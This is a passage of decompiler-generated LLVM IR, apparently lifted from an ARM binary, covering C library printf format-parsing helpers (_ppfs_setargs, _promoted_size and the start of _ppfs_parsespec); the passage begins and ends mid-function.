dec_label_pc_24d44:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_24d48 = load i32, i32* @r0, align 4
  %v2_24d48 = add i32 %v1_24d48, 8
  %v3_24d48 = inttoptr i32 %v2_24d48 to i32*
  store i32 0, i32* %v3_24d48, align 4
  %v0_24d4c = load i32, i32* %r5.global-to-local, align 4
  %v1_24d4c = load i32, i32* @r0, align 4
  %v2_24d4c = add i32 %v1_24d4c, 28
  %v3_24d4c = inttoptr i32 %v2_24d4c to i32*
  store i32 %v0_24d4c, i32* %v3_24d4c, align 4
  %v0_24d50 = load i32, i32* %r3.global-to-local, align 4
  %v1_24d50 = load i32, i32* @r0, align 4
  %v2_24d50 = add i32 %v1_24d50, 24
  %v3_24d50 = inttoptr i32 %v2_24d50 to i32*
  store i32 %v0_24d50, i32* %v3_24d50, align 4
  %v0_24d54 = load i32, i32* %r3.global-to-local, align 4
  %v1_24d54 = load i32, i32* @r0, align 4
  %v2_24d54 = add i32 %v1_24d54, 4
  %v3_24d54 = inttoptr i32 %v2_24d54 to i32*
  store i32 %v0_24d54, i32* %v3_24d54, align 4
  %v0_24d58 = call i32 @_ppfs_setargs()
  store i32 %v0_24d58, i32* @r0, align 4
  %v0_24d5c = load i32, i32* %r5.global-to-local, align 4
  %v1_24d5c = load i32, i32* @r4, align 4
  %v2_24d5c = add i32 %v1_24d5c, 24
  %v3_24d5c = inttoptr i32 %v2_24d5c to i32*
  store i32 %v0_24d5c, i32* %v3_24d5c, align 4
  br label %dec_label_pc_24d60

dec_label_pc_24d60:                               ; preds = %entry, %dec_label_pc_24d44
  %v2_24d64 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_24d64, i32* @r4, align 4
  %v1_24d68 = load i32, i32* @r0, align 4
  ret i32 %v1_24d68

; uselistorder directives
  uselistorder i32 %v0_24d2c, { 1, 0, 2 }
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_24d60, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_24d6c = load i32, i32* @r0, align 4
  %v1_24d6c = add i32 %v0_24d6c, 24
  %v2_24d6c = inttoptr i32 %v1_24d6c to i32*
  %v3_24d6c = load i32, i32* %v2_24d6c, align 4
  store i32 %v3_24d6c, i32* %r1.global-to-local, align 4
  %v2_24d70 = icmp eq i32 %v3_24d6c, 0
  %v3_24d74 = load i32, i32* @r4, align 4
  store i32 %v3_24d74, i32* %stack_var_-8, align 4
  %v1_24d78 = add i32 %v0_24d6c, 8
  %v2_24d78 = inttoptr i32 %v1_24d78 to i32*
  %v3_24d78 = load i32, i32* %v2_24d78, align 4
  store i32 %v3_24d78, i32* %r3.global-to-local, align 4
  %v6_24d80 = icmp eq i32 %v3_24d78, -2147483648
  br i1 %v2_24d70, label %dec_label_pc_24d80, label %dec_label_pc_24eb8

dec_label_pc_24d80:                               ; preds = %entry
  br i1 %v6_24d80, label %dec_label_pc_24d88, label %dec_label_pc_24da0

dec_label_pc_24d88:                               ; preds = %dec_label_pc_24d80
  %v1_24d88 = add i32 %v0_24d6c, 76
  %v2_24d88 = inttoptr i32 %v1_24d88 to i32*
  %v3_24d88 = load i32, i32* %v2_24d88, align 4
  store i32 %v3_24d88, i32* %r3.global-to-local, align 4
  %v1_24d8c = inttoptr i32 %v3_24d88 to i32*
  %v2_24d8c = load i32, i32* %v1_24d8c, align 4
  store i32 %v2_24d8c, i32* %r2.global-to-local, align 4
  %v1_24d90 = add i32 %v3_24d88, 4
  store i32 %v1_24d90, i32* %r3.global-to-local, align 4
  store i32 %v1_24d90, i32* %v2_24d88, align 4
  %v0_24d98 = load i32, i32* %r2.global-to-local, align 4
  %v1_24d98 = load i32, i32* @r0, align 4
  %v2_24d98 = add i32 %v1_24d98, 8
  %v3_24d98 = inttoptr i32 %v2_24d98 to i32*
  store i32 %v0_24d98, i32* %v3_24d98, align 4
  %v0_24d9c = load i32, i32* %r2.global-to-local, align 4
  %v1_24d9c = load i32, i32* @r0, align 4
  %v2_24d9c = add i32 %v1_24d9c, 80
  %v3_24d9c = inttoptr i32 %v2_24d9c to i32*
  store i32 %v0_24d9c, i32* %v3_24d9c, align 4
  %v0_24da0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_24da0

dec_label_pc_24da0:                               ; preds = %dec_label_pc_24d80, %dec_label_pc_24d88
  %v1_24dbc = phi i32 [ %v0_24d6c, %dec_label_pc_24d80 ], [ %v0_24da0.pre, %dec_label_pc_24d88 ]
  %v1_24da0 = add i32 %v1_24dbc, 4
  %v2_24da0 = inttoptr i32 %v1_24da0 to i32*
  %v3_24da0 = load i32, i32* %v2_24da0, align 4
  store i32 %v3_24da0, i32* %r3.global-to-local, align 4
  %v6_24da4 = icmp eq i32 %v3_24da0, -2147483648
  %v1_24da8 = add i32 %v1_24dbc, 80
  store i32 %v1_24da8, i32* %ip.global-to-local, align 4
  br i1 %v6_24da4, label %dec_label_pc_24db0, label %dec_label_pc_24dc8

dec_label_pc_24db0:                               ; preds = %dec_label_pc_24da0
  %v1_24db0 = add i32 %v1_24dbc, 76
  %v2_24db0 = inttoptr i32 %v1_24db0 to i32*
  %v3_24db0 = load i32, i32* %v2_24db0, align 4
  store i32 %v3_24db0, i32* %r3.global-to-local, align 4
  %v1_24db4 = inttoptr i32 %v3_24db0 to i32*
  %v2_24db4 = load i32, i32* %v1_24db4, align 4
  store i32 %v2_24db4, i32* %r2.global-to-local, align 4
  %v1_24db8 = add i32 %v3_24db0, 4
  store i32 %v1_24db8, i32* %r3.global-to-local, align 4
  store i32 %v1_24db8, i32* %v2_24db0, align 4
  %v0_24dc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_24dc0 = load i32, i32* @r0, align 4
  %v2_24dc0 = add i32 %v1_24dc0, 4
  %v3_24dc0 = inttoptr i32 %v2_24dc0 to i32*
  store i32 %v0_24dc0, i32* %v3_24dc0, align 4
  %v0_24dc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_24dc4 = load i32, i32* @r0, align 4
  %v2_24dc4 = add i32 %v1_24dc4, 80
  %v3_24dc4 = inttoptr i32 %v2_24dc4 to i32*
  store i32 %v0_24dc4, i32* %v3_24dc4, align 4
  %v0_24ea817.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_24dc8

dec_label_pc_24dc8:                               ; preds = %dec_label_pc_24da0, %dec_label_pc_24db0
  %v0_24ea817 = phi i32 [ %v1_24dbc, %dec_label_pc_24da0 ], [ %v0_24ea817.pre, %dec_label_pc_24db0 ]
  store i32 2055, i32* %r4.global-to-local, align 4
  %v0_24dcc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_24dcc, i32* %lr.global-to-local, align 4
  %v1_24ea818 = add i32 %v0_24ea817, 28
  %v2_24ea819 = inttoptr i32 %v1_24ea818 to i32*
  %v3_24ea820 = load i32, i32* %v2_24ea819, align 4
  store i32 %v3_24ea820, i32* %r3.global-to-local, align 4
  %v5_24eb022 = icmp slt i32 %v0_24dcc, %v3_24ea820
  br i1 %v5_24eb022, label %dec_label_pc_24dd4, label %dec_label_pc_24eb4.loopexit

dec_label_pc_24dd4:                               ; preds = %dec_label_pc_24dc8, %dec_label_pc_24ea8.backedge
  %v0_24ea824 = phi i32 [ %v0_24ea8, %dec_label_pc_24ea8.backedge ], [ %v0_24ea817, %dec_label_pc_24dc8 ]
  %v0_24de023 = phi i32 [ %v0_24de0.be, %dec_label_pc_24ea8.backedge ], [ %v0_24dcc, %dec_label_pc_24dc8 ]
  %v4_24dd4 = mul i32 %v0_24de023, 4
  %v5_24dd4 = add i32 %v4_24dd4, %v0_24ea824
  store i32 %v5_24dd4, i32* %r3.global-to-local, align 4
  %v1_24dd8 = add i32 %v5_24dd4, 40
  %v2_24dd8 = inttoptr i32 %v1_24dd8 to i32*
  %v3_24dd8 = load i32, i32* %v2_24dd8, align 4
  store i32 %v3_24dd8, i32* %r3.global-to-local, align 4
  %v7_24ddc = icmp eq i32 %v3_24dd8, 8
  %v1_24de0 = add i32 %v0_24de023, 1
  store i32 %v1_24de0, i32* %lr.global-to-local, align 4
  br i1 %v7_24ddc, label %dec_label_pc_24ea8.backedge, label %dec_label_pc_24de8

dec_label_pc_24de8:                               ; preds = %dec_label_pc_24dd4
  %v1_24de8 = add i32 %v0_24ea824, 76
  %v2_24de8 = inttoptr i32 %v1_24de8 to i32*
  %v3_24de8 = load i32, i32* %v2_24de8, align 4
  store i32 %v3_24de8, i32* %r1.global-to-local, align 4
  %v8_24dec = icmp sgt i32 %v3_24dd8, 8
  br i1 %v8_24dec, label %dec_label_pc_24e10, label %dec_label_pc_24df0

dec_label_pc_24df0:                               ; preds = %dec_label_pc_24de8
  %v7_24df0 = icmp eq i32 %v3_24dd8, 2
  br i1 %v7_24df0, label %dec_label_pc_24e60, label %dec_label_pc_24df8

dec_label_pc_24df8:                               ; preds = %dec_label_pc_24df0
  %v8_24df8 = icmp sgt i32 %v3_24dd8, 2
  br i1 %v8_24df8, label %dec_label_pc_24e08, label %dec_label_pc_24dfc

dec_label_pc_24dfc:                               ; preds = %dec_label_pc_24df8
  %v1_24dfc = icmp slt i32 %v3_24dd8, 0
  br i1 %v1_24dfc, label %dec_label_pc_24e94, label %dec_label_pc_24e60

dec_label_pc_24e08:                               ; preds = %dec_label_pc_24df8
  %v7_24e08 = icmp eq i32 %v3_24dd8, 7
  br i1 %v7_24e08, label %dec_label_pc_24e74, label %dec_label_pc_24e94

dec_label_pc_24e10:                               ; preds = %dec_label_pc_24de8
  %v7_24e10 = icmp eq i32 %v3_24dd8, 1024
  br i1 %v7_24e10, label %dec_label_pc_24e60, label %dec_label_pc_24e18

dec_label_pc_24e18:                               ; preds = %dec_label_pc_24e10
  %v8_24e18 = icmp sgt i32 %v3_24dd8, 1024
  br i1 %v8_24e18, label %dec_label_pc_24e30, label %dec_label_pc_24e1c

dec_label_pc_24e1c:                               ; preds = %dec_label_pc_24e18
  switch i32 %v3_24dd8, label %dec_label_pc_24e94 [
    i32 256, label %dec_label_pc_24e60
    i32 512, label %dec_label_pc_24e60
  ]

dec_label_pc_24e30:                               ; preds = %dec_label_pc_24e18
  %v7_24e30 = icmp eq i32 %v3_24dd8, 2048
  br i1 %v7_24e30, label %dec_label_pc_24e44, label %dec_label_pc_24e3c

dec_label_pc_24e3c:                               ; preds = %dec_label_pc_24e30
  %v1_24e38 = load i32, i32* %r4.global-to-local, align 4
  %v9_24e38 = icmp eq i32 %v3_24dd8, %v1_24e38
  br i1 %v9_24e38, label %dec_label_pc_24e74, label %dec_label_pc_24e94

dec_label_pc_24e44:                               ; preds = %dec_label_pc_24e30
  %v1_24e44 = add i32 %v3_24de8, 7
  %v1_24e48 = and i32 %v1_24e44, -8
  store i32 %v1_24e48, i32* %r3.global-to-local, align 4
  %v1_24e4c = inttoptr i32 %v1_24e48 to i32*
  %v2_24e4c = load i32, i32* %v1_24e4c, align 8
  store i32 %v2_24e4c, i32* %r1.global-to-local, align 4
  %v3_24e4c = or i32 %v1_24e48, 4
  %v4_24e4c = inttoptr i32 %v3_24e4c to i32*
  %v5_24e4c = load i32, i32* %v4_24e4c, align 4
  store i32 %v5_24e4c, i32* %r2.global-to-local, align 4
  %v1_24e50 = add i32 %v1_24e48, 8
  store i32 %v1_24e50, i32* %r3.global-to-local, align 4
  store i32 %v1_24e50, i32* %v2_24de8, align 4
  %v0_24e58 = load i32, i32* %ip.global-to-local, align 4
  %v1_24e58 = inttoptr i32 %v0_24e58 to i32*
  %v2_24e58 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_24e58, i32* %v1_24e58, align 4
  %v3_24e58 = add i32 %v0_24e58, 4
  %v4_24e58 = inttoptr i32 %v3_24e58 to i32*
  %v5_24e58 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_24e58, i32* %v4_24e58, align 4
  br label %dec_label_pc_24ea4

dec_label_pc_24e60:                               ; preds = %dec_label_pc_24e1c, %dec_label_pc_24e1c, %dec_label_pc_24dfc, %dec_label_pc_24e10, %dec_label_pc_24df0
  %v1_24e60 = inttoptr i32 %v3_24de8 to i32*
  %v2_24e60 = load i32, i32* %v1_24e60, align 4
  store i32 %v2_24e60, i32* %r2.global-to-local, align 4
  %v1_24e64 = add i32 %v3_24de8, 4
  store i32 %v1_24e64, i32* %r3.global-to-local, align 4
  store i32 %v1_24e64, i32* %v2_24de8, align 4
  %v0_24e6c = load i32, i32* %r2.global-to-local, align 4
  %v1_24e6c = load i32, i32* %ip.global-to-local, align 4
  %v2_24e6c = inttoptr i32 %v1_24e6c to i32*
  store i32 %v0_24e6c, i32* %v2_24e6c, align 4
  br label %dec_label_pc_24ea4

dec_label_pc_24e74:                               ; preds = %dec_label_pc_24e08, %dec_label_pc_24e3c
  %v3_24e74 = load i32, i32* %v2_24de8, align 4
  %v1_24e78 = add i32 %v3_24e74, 7
  %v1_24e7c = and i32 %v1_24e78, -8
  store i32 %v1_24e7c, i32* %r3.global-to-local, align 4
  %v1_24e80 = inttoptr i32 %v1_24e7c to i32*
  %v2_24e80 = load i32, i32* %v1_24e80, align 8
  store i32 %v2_24e80, i32* %r1.global-to-local, align 4
  %v3_24e80 = or i32 %v1_24e7c, 4
  %v4_24e80 = inttoptr i32 %v3_24e80 to i32*
  %v5_24e80 = load i32, i32* %v4_24e80, align 4
  store i32 %v5_24e80, i32* %r2.global-to-local, align 4
  %v1_24e84 = add i32 %v1_24e7c, 8
  store i32 %v1_24e84, i32* %r3.global-to-local, align 4
  store i32 %v1_24e84, i32* %v2_24de8, align 4
  %v0_24e8c = load i32, i32* %ip.global-to-local, align 4
  %v1_24e8c = inttoptr i32 %v0_24e8c to i32*
  %v2_24e8c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_24e8c, i32* %v1_24e8c, align 4
  %v3_24e8c = add i32 %v0_24e8c, 4
  %v4_24e8c = inttoptr i32 %v3_24e8c to i32*
  %v5_24e8c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_24e8c, i32* %v4_24e8c, align 4
  br label %dec_label_pc_24ea4

dec_label_pc_24e94:                               ; preds = %dec_label_pc_24e1c, %dec_label_pc_24e08, %dec_label_pc_24dfc, %dec_label_pc_24e3c
  %v1_24e94 = add i32 %v3_24de8, 4
  store i32 %v1_24e94, i32* %r3.global-to-local, align 4
  store i32 %v1_24e94, i32* %v2_24de8, align 4
  %v0_24e9c = load i32, i32* %r1.global-to-local, align 4
  %v1_24e9c = inttoptr i32 %v0_24e9c to i32*
  %v2_24e9c = load i32, i32* %v1_24e9c, align 4
  store i32 %v2_24e9c, i32* %r3.global-to-local, align 4
  %v1_24ea0 = load i32, i32* %ip.global-to-local, align 4
  %v2_24ea0 = inttoptr i32 %v1_24ea0 to i32*
  store i32 %v2_24e9c, i32* %v2_24ea0, align 4
  br label %dec_label_pc_24ea4

dec_label_pc_24ea4:                               ; preds = %dec_label_pc_24e74, %dec_label_pc_24e60, %dec_label_pc_24e44, %dec_label_pc_24e94
  %v0_24ea4 = load i32, i32* %ip.global-to-local, align 4
  %v1_24ea4 = add i32 %v0_24ea4, 8
  store i32 %v1_24ea4, i32* %ip.global-to-local, align 4
  %v0_24eac.pre.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_24ea8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_24ea8.backedge

dec_label_pc_24ea8.backedge:                      ; preds = %dec_label_pc_24ea4, %dec_label_pc_24dd4
  %v0_24ea8 = phi i32 [ %v0_24ea8.pre, %dec_label_pc_24ea4 ], [ %v0_24ea824, %dec_label_pc_24dd4 ]
  %v0_24de0.be = phi i32 [ %v0_24eac.pre.pre, %dec_label_pc_24ea4 ], [ %v1_24de0, %dec_label_pc_24dd4 ]
  %v1_24ea8 = add i32 %v0_24ea8, 28
  %v2_24ea8 = inttoptr i32 %v1_24ea8 to i32*
  %v3_24ea8 = load i32, i32* %v2_24ea8, align 4
  store i32 %v3_24ea8, i32* %r3.global-to-local, align 4
  %v5_24eb0 = icmp slt i32 %v0_24de0.be, %v3_24ea8
  br i1 %v5_24eb0, label %dec_label_pc_24dd4, label %dec_label_pc_24ea8.dec_label_pc_24eb4.loopexit_crit_edge

dec_label_pc_24eb8:                               ; preds = %entry
  br i1 %v6_24d80, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_24eb8
  %v2_24ebc = add i32 %v0_24d6c, 36
  %v3_24ebc = inttoptr i32 %v2_24ebc to i8*
  %v4_24ebc = load i8, i8* %v3_24ebc, align 1
  %v5_24ebc = zext i8 %v4_24ebc to i32
  %v5_24ec0 = mul nuw nsw i32 %v5_24ebc, 8
  %v6_24ec0 = add i32 %v5_24ec0, %v0_24d6c
  store i32 %v6_24ec0, i32* %r3.global-to-local, align 4
  %v2_24ec4 = add i32 %v6_24ec0, 72
  %v3_24ec4 = inttoptr i32 %v2_24ec4 to i32*
  %v4_24ec4 = load i32, i32* %v3_24ec4, align 4
  store i32 %v4_24ec4, i32* %r3.global-to-local, align 4
  store i32 %v4_24ec4, i32* %v2_24d78, align 4
  %v0_24ecc.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_24eb8, %bb
  %v2_24ee0 = phi i32 [ %v0_24ecc.pre, %bb ], [ %v0_24d6c, %dec_label_pc_24eb8 ]
  %v1_24ecc = add i32 %v2_24ee0, 4
  %v2_24ecc = inttoptr i32 %v1_24ecc to i32*
  %v3_24ecc = load i32, i32* %v2_24ecc, align 4
  store i32 %v3_24ecc, i32* %r3.global-to-local, align 4
  %v6_24ed0 = icmp eq i32 %v3_24ecc, -2147483648
  br i1 %v6_24ed0, label %bb16, label %dec_label_pc_24eb4

bb16:                                             ; preds = %.thread1
  %v2_24ed4 = add i32 %v2_24ee0, 37
  %v3_24ed4 = inttoptr i32 %v2_24ed4 to i8*
  %v4_24ed4 = load i8, i8* %v3_24ed4, align 1
  %v5_24ed4 = zext i8 %v4_24ed4 to i32
  %v5_24ed8 = mul nuw nsw i32 %v5_24ed4, 8
  %v6_24ed8 = add i32 %v5_24ed8, %v2_24ee0
  store i32 %v6_24ed8, i32* %r3.global-to-local, align 4
  %v2_24edc = add i32 %v6_24ed8, 72
  %v3_24edc = inttoptr i32 %v2_24edc to i32*
  %v4_24edc = load i32, i32* %v3_24edc, align 4
  store i32 %v4_24edc, i32* %r3.global-to-local, align 4
  store i32 %v4_24edc, i32* %v2_24ecc, align 4
  %v0_24ee4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_24eb4

dec_label_pc_24ea8.dec_label_pc_24eb4.loopexit_crit_edge: ; preds = %dec_label_pc_24ea8.backedge
  br label %dec_label_pc_24eb4.loopexit

dec_label_pc_24eb4.loopexit:                      ; preds = %dec_label_pc_24ea8.dec_label_pc_24eb4.loopexit_crit_edge, %dec_label_pc_24dc8
  %v0_24ea8.lcssa = phi i32 [ %v0_24ea8, %dec_label_pc_24ea8.dec_label_pc_24eb4.loopexit_crit_edge ], [ %v0_24ea817, %dec_label_pc_24dc8 ]
  br label %dec_label_pc_24eb4

dec_label_pc_24eb4:                               ; preds = %dec_label_pc_24eb4.loopexit, %.thread1, %bb16
  %v1_24f04 = phi i32 [ %v0_24ea8.lcssa, %dec_label_pc_24eb4.loopexit ], [ %v2_24ee0, %.thread1 ], [ %v0_24ee4.pre, %bb16 ]
  %v1_24ee4 = add i32 %v1_24f04, 8
  %v2_24ee4 = inttoptr i32 %v1_24ee4 to i32*
  %v3_24ee4 = load i32, i32* %v2_24ee4, align 4
  store i32 %v3_24ee4, i32* %r1.global-to-local, align 4
  %v1_24ee8 = icmp slt i32 %v3_24ee4, 0
  br i1 %v1_24ee8, label %dec_label_pc_24ef0, label %dec_label_pc_24f10

dec_label_pc_24ef0:                               ; preds = %dec_label_pc_24eb4
  %v1_24ef0 = add i32 %v1_24f04, 16
  %v2_24ef0 = inttoptr i32 %v1_24ef0 to i32*
  %v3_24ef0 = load i32, i32* %v2_24ef0, align 4
  %v1_24ef8 = sub i32 0, %v3_24ee4
  store i32 %v1_24ef8, i32* %r1.global-to-local, align 4
  %v1_24ef4 = and i32 %v3_24ef0, -10
  %v1_24efc = or i32 %v1_24ef4, 8
  store i32 %v1_24efc, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_24f04 = add i32 %v1_24f04, 20
  %v3_24f04 = inttoptr i32 %v2_24f04 to i32*
  store i32 32, i32* %v3_24f04, align 4
  %v0_24f08 = load i32, i32* %r1.global-to-local, align 4
  %v1_24f08 = load i32, i32* @r0, align 4
  %v2_24f08 = add i32 %v1_24f08, 8
  %v3_24f08 = inttoptr i32 %v2_24f08 to i32*
  store i32 %v0_24f08, i32* %v3_24f08, align 4
  %v0_24f0c = load i32, i32* %r3.global-to-local, align 4
  %v1_24f0c = load i32, i32* @r0, align 4
  %v2_24f0c = add i32 %v1_24f0c, 16
  %v3_24f0c = inttoptr i32 %v2_24f0c to i32*
  store i32 %v0_24f0c, i32* %v3_24f0c, align 4
  %v1_24f14.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_24f10

dec_label_pc_24f10:                               ; preds = %dec_label_pc_24eb4, %dec_label_pc_24ef0
  %v1_24f14 = phi i32 [ %v1_24f04, %dec_label_pc_24eb4 ], [ %v1_24f14.pre, %dec_label_pc_24ef0 ]
  %v2_24f10 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_24f10, i32* @r4, align 4
  ret i32 %v1_24f14

; uselistorder directives
  uselistorder i32 %v2_24ee0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_24de0.be, { 1, 0 }
  uselistorder i32 %v0_24ea8, { 1, 2, 0 }
  uselistorder i32 %v3_24de8, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_24de8, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_24dd8, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_24de023, { 1, 0 }
  uselistorder i32 %v0_24ea824, { 0, 2, 1 }
  uselistorder i32 %v0_24ea817, { 2, 0, 1 }
  uselistorder i32 %v0_24d6c, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 17, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder label %dec_label_pc_24f10, { 1, 0 }
  uselistorder label %dec_label_pc_24eb4, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_24ea4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_24e94, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_24e74, { 1, 0 }
  uselistorder label %dec_label_pc_24e60, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_24dd4, { 1, 0 }
  uselistorder label %dec_label_pc_24dc8, { 1, 0 }
  uselistorder label %dec_label_pc_24da0, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_24f38.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_24f34

dec_label_pc_24f34:                               ; preds = %dec_label_pc_24f40, %entry
  %v0_24f34 = phi i32 [ %v1_24f34, %dec_label_pc_24f40 ], [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39338), %entry ]
  %v1_24f34 = add i32 %v0_24f34, -2
  %v2_24f34 = inttoptr i32 %v1_24f34 to i16*
  %v3_24f34 = load i16, i16* %v2_24f34, align 2
  %v4_24f34 = sext i16 %v3_24f34 to i32
  store i32 %v1_24f34, i32* @ip, align 4
  %v9_24f38 = icmp eq i32 %v4_24f34, %v1_24f38.pre
  br i1 %v9_24f38, label %dec_label_pc_24f34.dec_label_pc_24f48_crit_edge, label %dec_label_pc_24f40

dec_label_pc_24f34.dec_label_pc_24f48_crit_edge:  ; preds = %dec_label_pc_24f34
  br label %dec_label_pc_24f48

dec_label_pc_24f40:                               ; preds = %dec_label_pc_24f34
  %tmp = icmp ugt i32 %v1_24f34, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39362)
  br i1 %tmp, label %dec_label_pc_24f34, label %dec_label_pc_24f48.loopexit

dec_label_pc_24f48.loopexit:                      ; preds = %dec_label_pc_24f40
  br label %dec_label_pc_24f48

dec_label_pc_24f48:                               ; preds = %dec_label_pc_24f48.loopexit, %dec_label_pc_24f34.dec_label_pc_24f48_crit_edge
  %v2_24f58.pre-phi = sub i32 %v1_24f34, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39362)
  store i32 %v2_24f58.pre-phi, i32* @r2, align 4
  %v4_24f5c = sdiv i32 %v2_24f58.pre-phi, 2
  %v5_24f5c = add i32 %v4_24f5c, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39338)
  %v6_24f5c = inttoptr i32 %v5_24f5c to i8*
  %v7_24f5c = load i8, i8* %v6_24f5c, align 1
  %v9_24f5c = zext i8 %v7_24f5c to i32
  ret i32 %v9_24f5c

; uselistorder directives
  uselistorder i32 %v2_24f58.pre-phi, { 1, 0 }
  uselistorder i32 %v1_24f34, { 1, 0, 3, 4, 2 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39362), { 1, 0 }
}

define i32 @_ppfs_parsespec(i8* %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp117 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_24f70 = load i32, i32* @r4, align 4
  store i32 %v3_24f70, i32* %stack_var_-36, align 4
  %v6_24f70 = load i32, i32* @r5, align 4
  %v27_24f70 = load i32, i32* @lr, align 4
  %v0_24f74 = load i32, i32* %r0.global-to-local, align 4
  %v1_24f74 = add i32 %v0_24f74, 16
  %v2_24f74 = inttoptr i32 %v1_24f74 to i32*
  %v3_24f74 = load i32, i32* %v2_24f74, align 4
  %v1_24f7c = and i32 %v3_24f74, 128
  store i32 %v1_24f7c, i32* @r4, align 4
  %v2_24f7c = icmp eq i32 %v1_24f7c, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_24f74, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @lr, align 4
  %v1_24fa4 = add i32 %v0_24f74, 24
  %v2_24fa4 = inttoptr i32 %v1_24fa4 to i32*
  %v3_24fa4 = load i32, i32* %v2_24fa4, align 4
  store i32 %v3_24fa4, i32* %fp.global-to-local, align 4
  br i1 %v2_24f7c, label %.dec_label_pc_24ff8_crit_edge, label %dec_label_pc_24fb0

.dec_label_pc_24ff8_crit_edge:                    ; preds = %entry
  %v2_24fa8 = inttoptr i32 %v0_24f74 to i32*
  %v3_24fa8 = load i32, i32* %v2_24fa8, align 4
  store i32 %v3_24fa8, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_24ff8

dec_label_pc_24fb0:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_24fc0 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_24fb4

dec_label_pc_24fb4:                               ; preds = %dec_label_pc_24fe4.dec_label_pc_24fb4_crit_edge, %dec_label_pc_24fb0
  %v1_24fc4 = phi i32 [ %v1_24fd4, %dec_label_pc_24fe4.dec_label_pc_24fb4_crit_edge ], [ 0, %dec_label_pc_24fb0 ]
  %v0_24fb4 = phi i32 [ %v0_24fb4.pre, %dec_label_pc_24fe4.dec_label_pc_24fb4_crit_edge ], [ %v0_24f74, %dec_label_pc_24fb0 ]
  %v1_24fb4 = inttoptr i32 %v0_24fb4 to i32*
  %v2_24fb4 = load i32, i32* %v1_24fb4, align 4
  %v4_24fb8 = mul i32 %v1_24fc4, 4
  %v5_24fb8 = add i32 %v2_24fb4, %v4_24fb8
  store i32 %v5_24fb8, i32* %r3.global-to-local, align 4
  %v1_24fbc = add i32 %v5_24fb8, -4
  %v2_24fbc = inttoptr i32 %v1_24fbc to i8*
  %v3_24fbc = load i8, i8* %v2_24fbc, align 1
  %v4_24fbc = zext i8 %v3_24fbc to i32
  store i32 %v4_24fbc, i32* %r1.global-to-local, align 4
  store i32 %v2_24fc0, i32* @ip, align 4
  %v2_24fc4 = add i32 %v1_24fc4, %v2_24fc0
  store i32 %v2_24fc4, i32* %r2.global-to-local, align 4
  %v3_24fc8 = add i32 %v2_24fc4, -72
